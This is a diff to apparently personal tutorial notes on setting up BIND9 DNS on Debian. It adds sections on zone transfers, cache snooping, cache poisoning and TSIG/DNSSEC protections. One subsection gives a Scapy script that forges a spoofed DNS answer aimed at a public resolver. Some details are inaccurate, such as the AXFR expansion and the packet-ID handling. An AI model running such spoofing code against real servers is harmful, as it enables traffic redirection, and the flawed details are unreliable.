@@ -1,3 +1,6 @@
+
+
+
 # DNS
 > - we will install our dns on Debian
 >   - its a stable distro for networking
@@ -81,7 +84,7 @@ Configuration: Forward zones are configured in the DNS server's configuration fi
 ---
 
 
-## Differences from Reverse Zones
+## Differences between Reverse and Forward Zones
 While both forward and reverse zones play essential roles in DNS, they serve opposite functions:
 
     Forward Zones: Translate domain names into IP addresses.
@@ -104,7 +107,7 @@ In essence, forward zones are about translating names to numbers, whereas revers
 ---
 
 ***Alternative Configuration:*** Defining Specific Clients
-- Instead of using allow-query { any; };, you could define ***specific clients*** that are allowed to query the DNS server.
+- Instead of using `allow-query { any; };`, you could define ***specific clients*** that are allowed to query the DNS server.
 > - This approach enhances security by limiting access to trusted clients. You can achieve this by specifying IP addresses, networks, or even creating named ACLs (Access Control Lists) that group certain clients together.
 
 Here's an example of how to define specific clients using IP addresses:
@@ -116,7 +119,35 @@ Here's an example of how to define specific clients using IP addresses:
 > - This method provides a more controlled environment compared to allow-query { any; };.
 
 ---
+## Zone Transfer
+Zone transfer is an important mechanism to ensure that all DNS servers have the same data set. 
+When changes are made to the zone files, they are synchronized via the zone transfer. 
+> `AXFR` (Asynchronous Full Transfer Zone) is a method used for this purpose.
 
+```mermaid
+sequenceDiagram
+    participant Client 
+    participant SourceDNS 
+    participant TargetDNS 
+    participant QueryZoneFile 
+    participant SendResponse 
+    participant CheckPermissions 
+    participant TransferZoneData 
+    participant DenyZoneTransfer 
+
+    Client ->> SourceDNS: Client request
+    SourceDNS ->> QueryZoneFile: Query zone file
+    QueryZoneFile ->> SendResponse: Send response
+    Client ->> TargetDNS: Zone transfer request
+    TargetDNS ->> CheckPermissions: Check permissions
+    CheckPermissions ->> TransferZoneData: Permissions granted
+    CheckPermissions ->> DenyZoneTransfer: Permissions denied
+    TransferZoneData ->> TargetDNS: Transfer zone data
+
+```
+
+> -  When a client requests a zone transfer, the source DNS server queries the zone file, sends a response to the client
+> -  the target DNS server checks permissions. If permissions are granted, the zone data is transferred; otherwise, the transfer is denied.
 ## Understanding DNS Query Output
 
 When querying a DNS server for domain name resolution, the response contains several sections that provide detailed information about the queried domain. 
@@ -222,7 +253,7 @@ Here's a breakdown of these sections based on the example output you provided:
 >  version "not available"; // Disable for security
 >};
 >```
-
+> 
 ---
 
 - edit `nano /etc/bind/named.conf.local`
@@ -438,8 +469,8 @@ rndc dumpdb > named_dump.db
 
 ---
 
-## Security, Snooping & Spoofing
-### Spoofing
+## Attack Vectors
+### Snooping
 - we can get the ip's of the clients that that send DNS-requests to the server
   - this is because the dns stores/caches the ips of the clients for the reverse request to speed up the connection-process
 ```Bash
@@ -477,4 +508,116 @@ dig +norecurse @192.168.122.7 foreman.de
 > now we know that `localhost` made a DNS-request for `foreman.de`
 
 ---
+## DNS Cache-Poisining
+ DNS cache poisoning, is a malicious activity where an attacker injects false DNS records into a DNS server's cache. 
+> - This manipulation tricks the DNS server into returning incorrect IP addresses for a domain name, redirecting users to malicious websites instead of legitimate ones.
+
+- Attackers often target DNS servers that are not properly secured or configured, leading to successful redirection of traffic.
+
+***DNS Spoofing***
+DNS spoofing exploits vulnerabilities in the DNS protocol to trick a DNS server into associating a domain name with an incorrect IP address.
+ 
+
+
+```mermaid
+sequenceDiagram
+    participant Attacker as Attacker
+    participant NSXX as Controlled DNS Server XX
+    participant PublicNSYY as Public DNS Server YY
+    participant User as User
+
+    Attacker->>NSXX: Takes control of DNS Server XX
+    Note over Attacker,NSXX: Manipulates DNS Server XX
+
+    User->>PublicNSYY: Requests resolution for test.example.com
+    PublicNSYY->>NSXX: Queries DNS Server XX for test.example.com
+    Note over PublicNSYY,NSXX: DNS Server XX responds with manipulated record
+
+    NSXX-->>PublicNSYY: Returns correct IP for test.example.com + fake record for de.wikipedia.org (192.0.2.1)
+    PublicNSYY-->>User: Caches the fake record for de.wikipedia.org (192.0.2.1)
+
+    Note over PublicNSYY: Later, User requests de.wikipedia.org
+
+    User->>PublicNSYY: Requests resolution for de.wikipedia.org
+    PublicNSYY-->>User: Returns cached fake IP (192.0.2.1) for de.wikipedia.org
+
+    Note over User: User tries to access de.wikipedia.org but is redirected to a different site
+```
+
+***IP Spoofing***
+IP spoofing in the context of DNS spoofing involves forging the sender's IP address in the packet header to make it appear as if the packet comes from a trusted source, such as a legitimate DNS server. 
+This technique allows an attacker to bypass certain security mechanisms that rely on verifying the origin of the traffic.
+```Python
+pip install scapy
+from scapy.all import *
+
+# Define the destination IP (the victim's DNS server)
+dst_ip = "8.8.8.8"  # Google's DNS server as an example
+
+# Define the source IP (the attacker's IP, spoofed)
+src_ip = "192.168.1.100"
+
+# Create a DNS query packet
+query_packet = IP(dst=dst_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="www.example.com"))
+
+# Create a DNS response packet with a spoofed IP address
+response_packet = IP(src=src_ip, dst=dst_ip)/UDP(sport=12345, dport=53)/DNS(id=query_packet[DNS].id, aa=True, qr=True, rcode=0, an=DNSRR(rrname="www.example.com", ttl=10, rdata="192.0.2.1"))
+
+# Send the DNS response packet
+send(response_packet)
+
+print("Sent DNS response packet.")
+```
+> -   We construct a DNS query packet targeting `www.example.com`.
+> -   We then create a DNS response packet that includes our spoofed source IP (`src_ip`) and the actual destination IP (`dst_ip`). The response packet is crafted to mimic a legitimate DNS response for `www.example.com`, directing it to an IP address (`192.0.2.1`) of the attacker's choice.
+> -   Finally, we send the crafted DNS response packet towards the DNS server.
+
+
+
+
+
+
+
+---
+## Protection
+
+***Preventing DNS Cache Poisoning and DNS Spoofing***
+- ***Use of TSIG Authentication:*** Transaction SIGnature (TSIG) authentication adds a layer of security to DNS transactions by ensuring that DNS messages are authenticated and integrity-checked. This prevents attackers from injecting false DNS records into a DNS server's cache.
+ -  ***Implement DNSSEC:*** DNS Security Extensions (DNSSEC) signs DNS data with digital signatures, ensuring that DNS responses cannot be tampered with. DNSSEC verifies the authenticity of DNS data, preventing attackers from successfully poisoning DNS caches.
+ - ***Limit Zone Transfers:*** Limiting zone transfer requests can prevent attackers from obtaining copies of a DNS zone file, which they could then use to poison DNS caches.
+- ***Regularly Monitor and Audit DNS Servers:*** Regular monitoring and auditing of DNS servers can help identify suspicious activities, such as unexpected changes to DNS records or unusual patterns of DNS queries.
+- ***Update DNS Software:*** Keeping DNS software up-to-date ensures that any known vulnerabilities are patched, reducing the risk of DNS cache poisoning attacks.
+
+***Practical Example of DNS Cache Poisoning Prevention***
+Let's consider a scenario where you're setting up a DNS server using BIND9. To mitigate the risk of DNS cache poisoning, you should implement TSIG authentication for DNS transactions. Here's how you can configure TSIG authentication in BIND9:
+
+- Generate a Key: First, generate a shared secret key for TSIG authentication. 
+- This can be done using the dnssec-keygen tool:
+
+```Bash
+# dnssec-keygen -a HMAC-SHA512 -b 128 -n HOST mykey
+```
+
+> This command generates a pair of keys (`mykey.+165+000001.private`, `mykey.+165+000001.key`) and a key file (`Kmykey.+165+000001.key`) that you'll use for TSIG authentication.
+
+   ***Configure TSIG Authentication in BIND9:***
+   >  Edit your named.conf file to include the generated key and configure TSIG authentication for your zone transfers and dynamic updates.
+    
+```
+key "mykey" {
+    algorithm hmac-sha512;
+    secret "your_generated_key_here";
+};
+
+zone "example.com" {
+    type master;
+    file "/etc/bind/db.example.com";
+    allow-update { key "mykey"; };
+};
+```
+Replace "your_generated_key_here" with the content of the .key file generated by dnssec-keygen.
+
+By implementing TSIG authentication and regularly updating your DNS software, you can significantly reduce the risk of DNS cache poisoning and DNS spoofing attacks. 
+Remember, the effectiveness of these measures depends on the overall security posture of your DNS infrastructure, including secure network configurations and regular monitoring.
+
 
